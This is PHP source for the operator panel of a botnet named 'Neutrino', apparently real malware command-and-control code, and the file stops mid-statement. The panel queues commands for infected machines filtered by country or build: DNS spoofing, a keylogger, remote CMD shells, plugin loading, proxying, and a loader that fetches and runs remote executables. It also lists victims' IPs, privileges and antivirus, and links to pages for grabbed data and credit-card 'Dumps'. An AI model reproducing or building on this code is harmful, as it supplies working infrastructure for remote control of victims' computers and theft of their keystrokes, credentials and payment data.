<?php
header('Content-Type: text/html; charset=utf-8');
header('Cache-control: private');
define('N3N', 1);

if (!ini_get('date.timezone')) {
    date_default_timezone_set('GMT');
}

include __DIR__ . '/config.php';
include __DIR__ . '/functions.php';

include __DIR__ . '/IP2Location/IP2Location.php';
include __DIR__ . '/IP2Location/countries.php';
include __DIR__ . '/IP2Location/code2name.php';

global $country_array;
if (!CheckGuest()) {
    NotFound();
}

$_proto = 'http://';
if ((array_key_exists('HTTPS', $_SERVER) && $_SERVER['HTTPS'] === 'on') || (int)$_SERVER['SERVER_PORT'] === 443) {
    $_proto = 'https://';
}

$_server_port = '';
if ((int)$_SERVER['SERVER_PORT'] !== 80 && (int)$_SERVER['SERVER_PORT'] !== 443) {
    $_server_port = ':' . $_SERVER['SERVER_PORT'];
}

include __DIR__ . '/inc/auth.php';
session_start();

if (!array_key_exists('csrf', $_SESSION)) {
    $_SESSION['csrf'] = md5(md5(mt_rand() . microtime()));
}

?>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html>
    <head>
        <title>-Neutrino-</title>
        <meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>

        <link rel='stylesheet' href='./css/bootstrap.min.css'>
        <link rel='stylesheet' href='./css/custom.css'>
        <link rel='stylesheet' href='./css/datepicker.css'>

        <script type='text/javascript' src='./js/jquery-1.12.0.min.js'></script>
        <script type='text/javascript' src='./js/bootstrap.min.js'></script>

        <script type='text/javascript' src='./js/other.js'></script>
        <script type='text/javascript' src='./js/datepicker.js'></script>
        <script type='text/javascript' src='./js/dt.js'></script>
        <script type='text/javascript' src='./js/toggle.js'></script>
        <script type='text/javascript' src='./js/bootbox.js'></script>
        <link href='https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet'>
        <style type="text/css">
            body {
                font-family: 'Roboto', sans-serif;
            }
        </style>

    </head>
<body>
    <div class="navbar navbar-default" style="font-size: calc(8px + 0.3vw)">
        <div class="navbar-header">
            <a class="navbar-brand" href="" title="Refresh current page">Neutrino</a>
        </div>
        <div class="navbar-collapse collapse navbar-responsive-collapse" style="text-align: center;">
            <ul class="nav navbar-nav" style="display: table-row; vertical-align: middle;">
                <li><a href="<?php echo PAGE_TASKS ?>" title="Tasks"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-list"></span> Tasks manager</span></a></li>
                <li><a href="<?php echo PAGE_STATS ?>" title="Statistics"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-stats"></span> Statistics</span></a></li>
                <li><a href="<?php echo PAGE_CLIENTS ?>" title="Clients"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-user"></span> Clients</span></a></li>
                <li><a href="<?php echo PAGE_GRABBER ?>" title="Grabber"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-globe"></span> Grabber</span></a></li>
                <li><a href="<?php echo PAGE_PROXY ?>" title="Proxy list"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-globe"></span> Proxy list</span></a></li>
                <li><a href="<?php echo PAGE_LOGS ?>" title="Files & Logs"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-list-alt"></span> Files & Logs</span></a></li>
                <li><a href="<?php echo PAGE_DUMPS ?>" title="Dumps"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-credit-card"></span> Dumps</span></a></li>
                <li><a href="<?php echo PAGE_SETTINGS ?>" title="Settings"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-cog"></span> Settings</span></a></li>
            </ul>

            <ul class="nav navbar-nav navbar-right">
                <li><a href="<?php echo PAGE_UPLOAD ?>" title="Upload"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-upload"></span> Upload</span></a></li>
                <li><a href="<?php echo PAGE_LOGOUT ?>" title="Logout"><span style="vertical-align: middle;"><span class="glyphicon glyphicon-off"></span> Logout</span></a></li>
            </ul>
        </div>
    </div>
<?php
$mysqli = ConnectMySQLi($db_host, $db_login, $db_password, $db_database);

$_main_url = $_proto . $_SERVER['SERVER_NAME'] . $_server_port . substr(str_replace('\\', '/', realpath(__DIR__)), strlen(str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT'])))) . '/';
$_account_type = $mysqli->query('SELECT client_id FROM ' . DB_USERS . ' WHERE client_hash = "' . $mysqli->real_escape_string($_COOKIE['client_hash']) . '"')->fetch_object()->client_id;

$_c_codes = $GLOBALS['ccode'];
$_c_names = $GLOBALS['cname'];

$_act = array_key_exists('act', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['act'])) : 'tasks';
$_do = array_key_exists('do', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['do'])) : '';
$_task_id = array_key_exists('task_id', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['task_id'])) : '';
$_task_act = array_key_exists('task', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['task'])) : '';

if (array_key_exists('create_task', $_POST) && $_SESSION['csrf'] === $_POST['csrf']) {

    $task_id = time() . mt_rand(111111, 999999);
    $task_date = date('Y-m-d H:i:s');
    $task_type = !empty($_POST['task_type']) ? addslashes(EncodeCommand($_POST['task_type'])) : null;
    $task_param = !empty($_POST['task_param']) ? htmlspecialchars(addslashes($_POST['task_param'])) : null;

    if ($task_type && $task_param) {

        if ($task_type === 'FIND' || $task_type === 'CMD') {
            $task_param = urlencode($task_param);
            $task_param = str_replace('+', ' ', $task_param);
        }

        $task_by_clients = !empty($_POST['task_by_client_id']) ? 'ID:' . $_POST['task_by_client_id'] : $_POST['task_by_country'];
        $task_user = !empty($_COOKIE['client_id']) ? $_COOKIE['client_id'] : 'user';

        $task_execs_count = !empty($_POST['task_execution_limit']) ? (int)addslashes($_POST['task_execution_limit']) : '0';
        $task_by_build_id = !empty($_POST['task_by_build_id']) ? addslashes($_POST['task_by_build_id']) : 'NONE';

        $task_pref = '#' . $task_type . ' ';
        $sql = 'INSERT INTO ' . DB_TASKS . ' (task_id, task_date, task_pref, task_command, task_postf, task_status, task_by_user, task_execs, task_need_execs, task_given_execs, task_failed_execs, task_by_clients, task_by_build_id) ' .
            "VALUES ('$task_id', '$task_date', '$task_pref', '$task_param', '#', 1, '$task_user', 0, '$task_execs_count', 0, 0, '$task_by_clients', '$task_by_build_id')";

        $mysqli->query($sql);
    }
}

if ($_task_act) {
    task_action($mysqli, $_task_id, $_task_act);
}
if ($_act === 'tasks' || $_act === null) {

    $res = $mysqli->query('SELECT * FROM ' . DB_TASKS . ';');
    if ($res->num_rows > 0) {
        echo
            '<table class="table table-striped table-hover" align="center">' .
            '<tr style="vertical-align: middle;"><th>#</th>' .
            '<th><b> User </th>' .
            '<th><b> Task ID : Number </th>' .
            '<th><b> Creation date </th>' .
            '<th><b> Command </th>' .
            '<td style="text-align: center"><b> Status </td>' .
            '<td style="text-align: center"><b> Executed \ Need \ Failed </td>' .
            '<td style="text-align: center"><b> Country </td>' .
            '<td style="text-align: center"><b> Build id </td>' .
            '<td style="text-align: center">' .
            '<li class="pull-right dropdown" style ="list-style-type: none;">' .
            '<a style="text-decoration: none;" class="dropdown-toggle" data-toggle="dropdown" href="#"> Action <span class="caret"></span></a>' .
            '<ul class="dropdown-menu" style="text-align:left">' .
            '<li><a href="' . PAGE_TASKS . '&task=start_all_tasks"><span class="glyphicon glyphicon-play"></span> Run all tasks</a></li>' .
            '<li><a href="' . PAGE_TASKS . '&task=stop_all_tasks"><span class="glyphicon glyphicon-stop"></span> Stop all tasks</a></li>' .
            '<li class="divider"></li>' .
            '<li><a href="#" onclick=ConfirmDelete("' . PAGE_TASKS . '&task=kill_all_tasks");><span class="glyphicon glyphicon-trash"></span> Delete all tasks</a></li>' .
            '</ul>' .
            '</li>' .
            '</td>';

        for ($i = 0; $i < $res->num_rows; $i++) {
            $row = $res->fetch_assoc();
            echo '<tr class="active">' .
                '<td>' . $i . '</td>' .
                '<td> <i>' . $row['task_by_user'] . '</i></td>' .
                '<td>' . $row['task_id'] . ' : ' . $row['id'] . '</td>' .
                '<td> <i>' . $row['task_date'] . '</i></td>' .
                '<td>' . '<span class="label label-info"><b>' . CmdParser($row['task_pref']) . '</b></span> &nbsp;' . urldecode($row['task_command']) . CmdParser($row['task_postf']) . '</td>';

            echo $row['task_status'] ? '<td style="text-align: center;vertical-align:middle;"><span class="label label-success"><b> START </b></span></td>'
                : '<td style="text-align: center;vertical-align:middle;"><span class="label label-danger"><b> STOP </b></span></td>';

            $by_country = null;
            if (strlen($row['task_by_clients']) === 2) {
                $by_country = ShowFlag($row['task_by_clients'], $country_array[$row['task_by_clients']]) . ' ' . $country_array[$row['task_by_clients']] . ' (' . $row['task_by_clients'] . ')';
            } elseif ($row['task_by_clients'] === 'ALL') {
                $by_country = ShowFlag($row['task_by_clients'], $country_array[$row['task_by_clients']]);
            } else {
                $by_country = $row['task_by_clients'];
            }

            echo '<td style="text-align: center">' . $row['task_execs'] . " \\ " . $row['task_need_execs'] . " \\ " . $row['task_failed_execs'] . '</td>' .
                '<td style="text-align: center;vertical-align:middle;">' . $by_country . '</td>' .
                '<td style="text-align: center;vertical-align:middle;">' . $row['task_by_build_id'] . '</td>' .
                '<td style="text-align: right;">' .
                '<a href = "' . PAGE_TASKS . '&task_id=' . $row['task_id'] . '&task=start" title=Start><span class="glyphicon glyphicon-play"></span></span></a>' .
                '<a href = "' . PAGE_TASKS . '&task_id=' . $row['task_id'] . '&task=stop" title=Stop><span class="glyphicon glyphicon-stop"></span></a>' .
                '&nbsp;' .
                '<a href = "' . PAGE_TASKS . '&task_id=' . $row['task_id'] . '&task=repeat" title=Reload><span class="glyphicon glyphicon-retweet"></span></a>' .
                '&nbsp;' .
                '<a href = "#"  onclick=ConfirmDelete("' . PAGE_TASKS . '&task_id=' . $row['task_id'] . '&task=kill"); title=Delete><span class="glyphicon glyphicon-remove"></span></a>' .
                '</td>' .
                '</tr>';
        }
        echo '</td></tr><tr><tbody></table>';
    }
    ?>
    <div class="panel-group" id="accordion" style="width: 60%;margin: 0 auto;">
        <div class="panel panel-default" id="panel1">
            <div class="panel-heading">
                <h4 class="panel-title" style="text-align: center">
                    <a href="#" onclick="toggle(tasks_examples); return false;" title="Show options panel">show / hide tasks examples</a>
                </h4>
            </div>
            <div id="tasks_examples" class="panel-collapse collapse">
                <div class="panel-body">
                    <table class="table-condensed table-hover">
                        <tr class="active">
                            <td><b>Command</b></td>
                            <td><b>Options</b></td>
                            <td><b>Example</b></td>
                            <td><b>Description</b></td>
                        </tr>
                        <tr class="active">
                            <td><b>DNS Spoofing</b></td>
                            <td>original.com spoofed.com</td>
                            <td>google.com locked.com</td>
                            <td>type "remove" for delete redirect</td>
                        </tr>
                        <tr class="active">
                            <td><b>Start proxy</b></td>
                            <td> IP:PORT</td>
                            <td>127.0.0.1:7777</td>
                            <td>ip:port_of_backconnect_server</td>
                        </tr>
                        <tr class="active">
                            <td><b>Find file</b></td>
                            <td> filename.ext count(max. 200)</td>
                            <td>notepad.exe 3</td>
                            <td>You can specify a partial name, ex: "notepa"</td>
                        </tr>
						 <tr class="active">
                            <td><b>Keylogger</b></td>
                            <td>target_wind_name*target_wind_name1*target_wind_name2</td>
                            <td>login*welcome</td>
                            <td>type "_ALL_" for capture all windows</td>
                        </tr>
                        <tr class="active">
                            <td><b>CMD shell</b></td>
                            <td>command param</td>
                            <td>notepad readme.txt</td>
                            <td>---------</td>
                        </tr>
                        <tr class="active">
                            <td><b>CMD shell (with results)</b></td>
                            <td>command param</td>
                            <td>notepad readme.txt</td>
                            <td>---------</td>
                        </tr>
                        <tr class="active">
                            <td><b>Find process</b></td>
                            <td>processname</td>
                            <td>---------</td>
                            <td>You can specify a partial name, ex: "processna"</td>
                        </tr>
                        <tr class="active">
                            <td><b>Plugin</b></td>
                            <td>http://example.ru/plugin.n</td>
                            <td>http://example.ru/ammy.n</td>
                            <td>---------</td>
                        </tr>
                        <tr class="active">
                            <td><b>Loader</b></td>
                            <td>http://example.ru/file.ext param</td>
                            <td>http://example.ru/bot.exe debug</td>
                            <td>---------</td>
                        </tr>
                        <tr class="active">
                            <td><b>Update</b></td>
                            <td>http://example.ru/file.exe</td>
                            <td>---------</td>
                            <td>---------</td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>
    <br>
    <form action='<?php echo htmlentities($_SERVER['PHP_SELF']); ?>' method='POST'>
        <div class="panel panel-default" style="width: 60%;margin: 0 auto;">
            <div class="panel-body">
                <div class="input-group" style="width: 30%;float: left;">
                    <span class="input-group-addon">Command type :</span>
                    <select name="task_type" class="form-control">
                        <option>DNS Spoofing</option>
                        <option>Start proxy</option>
						<option>Keylogger</option>
                        <option>Find file</option>
                        <option>CMD shell</option>
                        <option>CMD shell (with results)</option>
                        <option>Find process</option>
                        <option>Plugin</option>
                        <option>Loader</option>
                        <option>Update</option>
                    </select>
                </div>
                <input type="text" style="width: 69%;margin-left:3px;" class="form-control"
                       placeholder="Enter the task parameters..." size="150" name="task_param" id="task_param">
                <br>
                <div style="float: left;">
                    <div class="input-group" style="width: 24%;float: left;">
                        <span class="input-group-addon">By country :</span>
                        <select name="task_by_country" class="form-control">
                            <option class="icon" value="ALL"> All countries</option>
                            <?php
                            for ($i = 1; $i < 247; $i++) {
                                echo '<option value=' . $_c_codes[$i] . ' >' . $_c_names[$i] . ' (' . $_c_codes[$i] . ')' . ' </option>';
                            }
                            ?>
                        </select>
                    </div>
                    <div class="input-group" style="width: 24%;float: left; margin-left:3px;">
                        <span class="input-group-addon">By build id :</span>
                        <select name="task_by_build_id" class="form-control">
                            <option class="icon" value="ALL"> All clients</option>
                            <?php
                            $sql_by_build_id = $mysqli->query('SELECT client_build_id, COUNT(*) AS counter FROM ' . DB_CLIENTS . ' GROUP BY client_build_id');
                            while ($build_id_array = $sql_by_build_id->fetch_array()) {
                                echo '<option value="' . $build_id_array['client_build_id'] . '"> ' . urldecode($build_id_array['client_build_id']) . ' (' . $build_id_array['counter'] . ')' . '</option>';
                            }
                            ?>
                        </select>
                    </div>

                    <div class="input-group" style="width: 26%;float: left; margin-left:3px;">
                        <span class="input-group-addon">By client id :</span>
                        <?php echo '<input type="text" class="form-control" name="task_by_client_id" size="50" value="';
                        if (array_key_exists('client_id', $_GET)) {
                            echo htmlentities($mysqli->real_escape_string($_GET['client_id']));
                        }
                        echo '"/>';
                        ?>
                    </div>

                    <div class="input-group" style="width: 24%;float: left; margin-left:3px;">
                        <span class="input-group-addon">Limit :</span>
                        <input type="text" class="form-control" placeholder="If empty - unlimited"
                               name='task_execution_limit'>
                    </div>
                </div>
            </div>
        </div>
        <br>
        <div style="text-align: center;">
            <input class="btn btn-default" type="submit" name="create_task" title="Create task" value="Create task">
        </div>
        <input name="csrf" type="hidden" value="<?php echo $_SESSION['csrf'] ?>">
    </form>
    <?php
}
if ($_act === 'statistics') {

    echo '<script type="text/javascript" src="https://www.google.com/jsapi"></script>'
        . '<div class="preloader loaderimg"></div>';

    include_once __DIR__ . '/inc/chart.php';

    $_knock_time = (time() - $mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "knock_rate"')->fetch_object()->config_value * 60);
    $_stat_action = array_key_exists('delete', $_POST) ? $mysqli->real_escape_string($_POST['delete']) : 0;

    if ($_stat_action && $_SESSION['csrf'] === $_POST['csrf']) {
        switch ($_stat_action) {
            case 'all':
                $mysqli->query('truncate table ' . DB_CLIENTS . '');
                break;
            case 'offline':
                $mysqli->query('DELETE FROM ' . DB_CLIENTS . ' WHERE client_time < ' . $_knock_time);
                break;
            case 'banned':
                $mysqli->query('truncate table ' . DB_BAN . '');
                break;
            default:
                break;
        }
    }
    $clients_total = fast_count_sql($mysqli, 'SELECT * FROM ' . DB_CLIENTS . ';');
    $clients_online = $mysqli->query('SELECT * FROM ' . DB_CLIENTS . ' WHERE client_time > ' . $_knock_time)->num_rows;
    $clients_offline = $mysqli->query('SELECT * FROM ' . DB_CLIENTS . ' WHERE `client_time` < ' . $_knock_time)->num_rows;
    $clients_hour = $mysqli->query('SELECT * FROM ' . DB_CLIENTS . ' WHERE ' . time() . ' - client_time < ' . (60 * 60))->num_rows;
    $clients_day = $mysqli->query('SELECT * FROM ' . DB_CLIENTS . ' WHERE ' . time() . ' - client_time < ' . (60 * 60 * 24))->num_rows;
    $clients_banned = $mysqli->query('SELECT * FROM ' . DB_BAN . ';')->num_rows;

    GetSmallStat($clients_online, $clients_offline, $clients_hour, $clients_day, $clients_total, $clients_banned);
    ?>
    <div style="text-align: center;">
        <form method="post" action="">
            <div class="btn-group btn-group-xs">
                <button type="submit" class="btn btn-default btn-xs" name="delete" value="all">Clear stat</button>
                <button type="submit" class="btn btn-default btn-xs" name="delete" value="offline">Clear offline
                </button>
                <button type="submit" class="btn btn-default btn-xs" name="delete" value="banned">Clear banned</button>
            </div>
            <input name="csrf" type="hidden" value="<?php echo $_SESSION['csrf']; ?>">
        </form>
    </div>
    <div class="container" style="width: 100%;">
        <div class="row">
            <div class="col-md-7">
                <div id="div_geo_map"></div>
            </div>
            <div class="col-md-4">
                <div id="div_top_statistics"></div>
                <div id="div_os_statistics"></div>
            </div>
        </div>
    </div>
    <?php
}
if ($_act === 'clients') {

    if (array_key_exists('reset', $_GET)) {
        echo '<script>location="' . PAGE_CLIENTS . '";</script>';
    }

    $sql = 'SELECT * FROM ' . DB_CLIENTS . '';
    $is_search = array_key_exists('filter', $_GET) ? 1 : 0;
    $by_countries = array_key_exists('countries', $_GET) ? htmlentities($mysqli->real_escape_string($_GET['countries'])) : '';
    $by_os = array_key_exists('client_os', $_GET) ? htmlentities($mysqli->real_escape_string($_GET['client_os'])) : 0;
    $by_ip = array_key_exists('client_ip', $_GET) ? htmlentities($mysqli->real_escape_string($_GET['client_ip'])) : 0;
    $by_id = array_key_exists('client_id', $_GET) ? htmlentities($mysqli->real_escape_string($_GET['client_id'])) : 0;
    $by_name = array_key_exists('client_name', $_GET) ? htmlentities($mysqli->real_escape_string($_GET['client_name'])) : 0;
    $by_build_id = array_key_exists('client_build_id', $_GET) ? htmlentities($mysqli->real_escape_string($_GET['client_build_id'])) : 0;

    $client_comment = array_key_exists('client_comment', $_GET) ? $mysqli->real_escape_string($_GET['client_comment']) : '';
    $client_knock_rate = ($mysqli->query('SELECT config_value FROM ' . DB_CONFIG . ' WHERE config_name = "knock_rate"')->fetch_object()->config_value) * 60;

    if (array_key_exists('action', $_GET) && $_SESSION['csrf'] == $_GET['csrf']) {

        switch ($_GET['action']) {
            case 'delete':
                QueryRedirect($mysqli, 'DELETE FROM ' . DB_CLIENTS . ' WHERE client_id="' . $by_id . '"', PAGE_CLIENTS);
                break;
            case 'add_comment':
                QueryRedirect($mysqli, 'UPDATE ' . DB_CLIENTS . ' SET client_comment = "' . $client_comment . '"  WHERE client_id = "' . $by_id . '";', PAGE_CLIENTS);
                break;
            default:
                break;
        }
    }

    if ($by_countries) {
        if ($by_countries !== 'ALL') {
            $sql .= " WHERE client_country = '" . $by_countries . "'";
        }
    }
    if ($by_os) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "client_os LIKE '%" . $by_os . "%'";
    }
    if ($by_ip) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "client_ip LIKE '%" . $by_ip . "%'";
    }
    if ($by_id) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "client_id LIKE '%" . $by_id . "%'";
    }
    if ($by_name) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "client_name LIKE '%" . $by_name . "%'";
    }
    if ($by_build_id) {
        if (strpos($sql, ' WHERE ') == FALSE) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "client_build_id = '" . $by_build_id . "'";
    }

    $sql .= ' ORDER BY client_time DESC';
    $page = array_key_exists('page', $_GET) ? $_GET['page'] : 0;

    $count_records = $mysqli->query($sql)->num_rows;
    $count_pages = floor($count_records / PAGE_LIMIT);

    if ($page) {
        $sql .= ' LIMIT ' . floor($page * PAGE_LIMIT) . ', ' . PAGE_LIMIT . '';
    } else {
        $sql .= ' LIMIT 0, ' . PAGE_LIMIT . '';
    }

    $str = null;
    foreach (explode('&', $_SERVER['QUERY_STRING']) as $s_str) {
        if (strpos($s_str, 'page')) {
            break;
        } else {
            $str .= htmlspecialchars($s_str) . '&';
        }
    }

    ?>
    <div class="modal fade" id="adv-search">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                    <h4 class="modal-title">Search filter</h4>
                </div>
                <form method="GET" action="">
                    <div class="modal-body">
                        <input type="hidden" name="act" value="clients">
                        <div class="input-group">
                            <span class="input-group-addon">By country</span>
                            <select class="form-control" name="countries" style="width: 100%">
                                <option value=ALL> All countries</option>
                                <?php
                                for ($i = 1; $i < 247; $i++) {
                                    echo '<option value=' . $_c_codes[$i] . '>' . ' ' . $_c_names[$i] . ' (' . $_c_codes[$i] . ')' . ' </option>';
                                }
                                ?>
                            </select>
                        </div>

                        <div class="input-group">
                            <span
                                class="input-group-addon">By client id</span>
                            <input class="form-control" id="client_id" name="client_id" type="text">
                        </div>

                        <div class="input-group">
                            <span class="input-group-addon">By name</span>
                            <input class="form-control" id="client_name" name="client_name" type="text">
                        </div>

                        <div class="input-group">
                            <span
                                class="input-group-addon">By client ip</span>
                            <input class="form-control" id="client_ip" name="client_ip" type="text">
                        </div>

                        <div class="input-group">
                            <span class="input-group-addon">By OS</span>
                            <select class="form-control" name="client_os" style="width: 100%">
                                <option value=""> All OS</option>
                                <?php
                                $query = $mysqli->query('SELECT client_os,COUNT(*) AS CNT FROM ' . DB_CLIENTS . ' GROUP BY client_os');
                                while ($row = $query->fetch_array()) {
                                    echo '<option value="' . $row['client_os'] . '"> ' . urldecode($row['client_os']) . '</option>';
                                }
                                ?>
                            </select>
                        </div>
                        <div class="input-group">
                            <span class="input-group-addon">By build id</span>
                            <select class="form-control" name="client_build_id" style="width: 100%">
                                <option value=""> All clients</option>
                                <?php
                                $sql_by_build_id = $mysqli->query('SELECT client_build_id, COUNT(*) AS counter FROM ' . DB_CLIENTS . ' GROUP BY client_build_id');
                                while ($build_id_array = $sql_by_build_id->fetch_array()) {
                                    echo '<option value="' . $build_id_array['client_build_id'] . '"> ' . urldecode($build_id_array['client_build_id']) . ' (' . $build_id_array['counter'] . ')' . '</option>';
                                }
                                ?>
                            </select>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary btn-sm btn-ok" name="filter">Search</button>
                        <button type="button" class="btn btn-default btn-sm" data-dismiss="modal">Cancel</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="panel panel-primary" style="margin: 0 auto; font-size: calc(7px + 0.3vw)">
        <div class="panel-heading"><b>Clients (<?php echo $count_records; ?>)</b></div>
        <form action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="GET"
              class="navbar-form navbar-right" role="search">
            <input type="hidden" name="act" value="clients">

            <div class="form-group form-group-sm">
                <input class="form-control" name="client_name" placeholder="Computer name" type="text">
            </div>

            <button type="submit" name="filter" class="btn btn-default btn-sm">Search</button>
            <?php
            if ($is_search) {
                echo '<button type="submit" class="btn btn-warning btn-sm" name="reset">Reset</button>';
            }
            ?>

            <div class="btn-group">
                <a href="#" class="btn btn-default btn-sm" data-toggle="dropdown">
                    Menu
                    <span class="caret"></span>
                </a>
                <ul class="dropdown-menu">
                    <li><a data-toggle="modal" data-target="#adv-search" href="#"><span class="glyphicon glyphicon-search"></span>Advanced search</a></li>
                </ul>
            </div>
        </form>
        <div>
            <?php
            echo '<table class="table table-responsive table-striped table-condensed table-hover">' .
                '<th><b>ID</b></th>' .
                '<th><b>Computer</b></th>' .
                '<th><b>IP</b>' .
                '<th><b>OS</b></th>' .
                '<th><b>Priv.</b></th>' .
                '<th><b>Antivirus</b></th>' .
                '<th><b>Country</b></th>' .
                '<th><b>Version</b></th>' .
                '<th><b>Build id</b></th>' .
                '<th><b>Status</b></th>' .
                '<th><b>Install date</b></th>' .
                '<th style="text-align: center;"><b>Options</b></th>' .
                '<tbody>';
            $res = $mysqli->query($sql);
            if ($res && $res->num_rows != 0) {
                for ($i = 0; $i < $res->num_rows; $i++) {
                    $row = $res->fetch_assoc();
                    echo '<div class="modal fade" id="add-comment-' . $i . '">'
                        . '<div class="modal-dialog">'
                        . '<div class="modal-content">'
                        . '<div class="modal-header">'
                        . '<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>'
                        . '<h4 class="modal-title">Add comment to \'' . $row['client_id'] . '\'</h4>'
                        . '</div>'
                        . '<form method="GET" action="">'
                        . '<input type="hidden" name="act" value="clients">'
                        . '<input type="hidden" name="client_id" value="' . $row['client_id'] . '">'
                        . '<input name="csrf" type="hidden" value="' . $_SESSION['csrf'] . '">'
                        . '<textarea style="width:100%;resize: none;" rows="10" cols="45" name="client_comment">'
                        . $row['client_comment']
                        . '</textarea>'
                        . '<div class="modal-footer">'
                        . '<button type="submit" class="btn btn-primary btn-ok" name="action" value="add_comment">Save</button>'
                        . '<button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>'
                        . '</div>'
                        . '</form>'
                        . '</div>'
                        . '</div>'
                        . '</div>';

                    echo '<tr class="active">';
                    echo '<td><a href = "?act=grabber&show_by_id=' . $row['client_id'] . '&&search" title="Show client logs">' . $row['client_id'] . '</td>' .
                        '<td>' . (urldecode($row['client_name'])) . '</a></td>' .
                        '<td>' . $row['client_ip'] . '</td>' .
                        '<td>' . urldecode($row['client_os']) . '</td>' .
                        '<td>' . ($row['client_priv'] ? 'Admin' : 'User') . '</td>' .
                        '<td>' . urldecode($row['client_av']) . '</td>' .
                        '<td style="vertical-align: middle;">' . ShowFlag($row['client_country'], $country_array[$row['client_country']]) . '&nbsp;' . $country_array[$row['client_country']] . ' (' . $row['client_country'] . ')' . '</td>' .
                        '<td>' . $row['client_version'] . '</td>' .
                        '<td>' . urldecode($row['client_build_id']) . '</td>';

                    if ((int)$row['client_time'] > (time() - $client_knock_rate)) {
                        echo '<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAQCAMAAACC7snvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkQ3RjQwMjI0MzlFODExRTRBNDg1ODJFMUI0NjVGQzA4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkQ3RjQwMjI1MzlFODExRTRBNDg1ODJFMUI0NjVGQzA4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RDdGNDAyMjIzOUU4MTFFNEE0ODU4MkUxQjQ2NUZDMDgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RDdGNDAyMjMzOUU4MTFFNEE0ODU4MkUxQjQ2NUZDMDgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5Fk6I0AAAAP1BMVEX///8AMwAAPgAAdAAAjwAAkQAAlAAAlgAAmAAAmQAAmgAAmwAAngAAoQAAowAAqQAArAAArQAArgAA/wD///+npAnLAAAAAXRSTlMAQObYZgAAAM9JREFUOMutk9sOwyAMQ4EMmrb0tuX/v3V26Z6WrZPWcGRFkWPBAyGEdEEFVHpcUIk59+H+N0hK27BdAIKGdT3Dzj0IWpaerP36sTGxMw+DuuUMk16+e2YEdfPsYmYdhSq2d5g3fSeFOE3Fw2YRm0ya8qAr+9TzM6jU6mBSKteb8lR2LHH8MUQ/px6Lh+5dafcScfwIGsfsYTJmLjblyeOhnh9BmtUFb1Au6itI0XGaxfEj6KbqgzeoChuoQG9Q5dQxR3w2/Rj1O/v3jxdUCE92yC3ZVzx+VgAAAABJRU5ErkJggg==" title="Last access: ' . $row['client_date'] . '"></td>';
                    } else {
